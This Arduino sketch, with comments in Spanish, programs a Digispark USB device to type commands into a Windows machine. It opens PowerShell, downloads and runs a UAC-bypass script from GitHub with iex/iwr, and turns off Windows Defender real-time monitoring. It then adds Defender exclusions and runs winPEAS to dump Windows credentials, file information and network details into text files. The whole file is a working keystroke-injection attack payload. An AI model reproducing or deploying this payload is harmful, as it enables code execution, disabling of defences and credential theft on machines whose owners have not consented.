#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("iex (iwr -UsebasicParsing https://raw.githubusercontent.com/BlackShell256/Bypass-Uac/main/Invoke-UAC.ps1)"));
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Invoke-UAC -Executable powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); // Desactiva la proteccion a tiempo real del Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Add-MpPreference -ExclusionPath C:/Users/user/Downloads"); //Cambier la ruta que quieres excluir del Windows Defender e incluir el binario de winPEAS
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(15000); //Incluir el binario de winPEAS.exe (https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx64.exe)
  digitalWrite(1, LOW);
  DigiKeyboard.println("cd C:/Users/user/Downloads"); //Cambier la ruta a la misma que pusiste anteriormente
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-MpPreference -ExclusionProcess winPEASx64.exe"); // Se excluira de analisis el proceso de winPEAS
  DigiKeyboard.delay(500);
  // Se ejecutara el binario para extraer credenciales, informacion, etc y se guradaran en .txt para su analisis
  DigiKeyboard.println("winPEASx64.exe windowscreds > wincreds.txt"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("winPEASx64.exe filesinfo > filesinfo.txt"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("winPEASx64.exe fileanalysis > fileanalysis.txt"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("winPEASx64.exe networkinfo > networkinfo.txt"); 
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(900000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
